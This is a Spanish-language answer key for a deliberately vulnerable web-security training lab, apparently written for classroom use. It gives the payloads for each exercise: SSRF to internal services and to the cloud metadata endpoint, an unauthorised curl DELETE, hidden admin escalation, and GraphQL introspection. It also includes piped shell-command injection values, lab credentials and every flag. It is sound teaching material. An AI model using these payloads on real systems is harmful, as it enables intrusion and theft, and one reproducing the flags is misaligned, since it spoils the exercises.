# Guia breve de soluciones

Levantar el laboratorio:

```bash
docker compose up --build
```

Abrir `http://IP:8080/`. El reto final no aparece en el menu; la ruta inicial es `http://IP:8080/testing`.

## Lab 1 - SSRF

Profesor: en el blog cambiar la URL de imagen por `http://127.0.0.1:5002/index.html` para leer el servicio interno.

Alumno: en el gestor de activos probar una URL interna o la metadata cloud simulada: `http://169.254.169.254/latest/meta-data`.

Flags:

- `FLAG{lab1_profesor_ssrf_internal_index}`
- `FLAG{lab1_alumno_ssrf_metadata_cloud}`

## Lab 2 - SSRF ciego

Usar una URL externa controlada por el estudiante en el validador. La aplicacion no muestra la respuesta, pero realiza una solicitud saliente y luego un POST con la flag.

Flags:

- `FLAG{lab2_profesor_ssrf_ciego_webhook}`
- `FLAG{lab2_alumno_ssrf_ciego_callback}`

## Lab 3 - BOLA

Ingresar con `jchavez@fifashopping.com:Argentina2026@`. El frontend solo permite leer vouchers/invoices. Probar la API con metodo `DELETE` contra un objeto existente:

```bash
curl -X DELETE http://IP:8080/A/lab3/api/objects/94cb5f0e-3f55-4b6d-a266-6f7225a131a1
```

La ruta compatible usada por la aplicacion es `/api/A/lab3/objects/<id>` o `/api/B/lab3/objects/<id>`.

Flags:

- `FLAG{lab3_profesor_bola_delete_object}`
- `FLAG{lab3_alumno_bola_object_abuse}`

## Lab 4 - BFLA

Ingresar con las mismas credenciales. Leer el JavaScript de la pagina y encontrar la ruta oculta `/A/lab4/administrador-5000/` o `/B/lab4/administrador-5000/`. Desde alli se puede modificar solamente el usuario propio y elevarlo a `admin`.

Flags:

- `FLAG{lab4_profesor_bfla_privilege_upgrade}`
- `FLAG{lab4_alumno_bfla_hidden_admin}`

## Lab 5 - GraphQL

La pagina lista usuarios limitados, pero el endpoint GraphQL real queda dentro del directorio del laboratorio:

- Profesor: `http://IP:8080/A/lab5/v1/graphql`
- Alumno: `http://IP:8080/B/lab5/v1/graphql`

Consulta:

```
{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }"}
```

```graphql
{ users { guid name email role flag } }
```

Introspection para descubrir campos del tipo `User`:

```graphql
{
  __type(name: "User") {
    name
    fields {
      name
      type {
        kind
        name
        ofType {
          kind
          name
        }
      }
    }
  }
}
```

Flags:

- `FLAG{lab5_profesor_graphql_admin_query}`
- `FLAG{lab5_alumno_graphql_admin_leak}`

## Lab 6 - Reto final

Ruta inicial: `/testing`.

1. Entrar como `lmessi@fifa2026.com:Argentina2026@`.
2. El frontend solo deja ver documentos `10` y `9`. Probar IDOR con `/testing/api/documents/1`.
3. Entrar como `ehaaland@fifa2026.com:Noruega2026@`.
4. En carga de documentos usar `http://169.254.169.254/latest/meta-data`.
5. La metadata revela `lyamal@fifa2026.com:España2026@`.
6. Entrar con ese usuario al panel administrativo.
7. En el duplicado usar un valor como `backup.txt | ls -la /tmp` o `backup.txt | cat /tmp/flag-admin.txt`.

Flags:

- `FLAG{lab6_idor_sigue_investigando_la_aplicacion}`
- `FLAG{lab6_command_injection_admin_backup}`
